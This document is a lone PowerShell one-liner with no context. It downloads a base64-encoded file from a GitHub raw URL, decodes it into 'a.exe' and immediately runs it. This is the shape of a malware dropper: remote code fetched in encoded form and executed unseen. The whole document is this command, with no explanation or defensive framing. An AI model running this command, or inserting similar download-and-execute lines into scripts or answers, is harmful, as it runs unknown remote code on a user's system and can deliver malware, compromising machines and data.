powershell -c "[IO.File]::WriteAllBytes('a.exe', [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/deep-oasis/test/main/main.enc')));.\a.exe;"
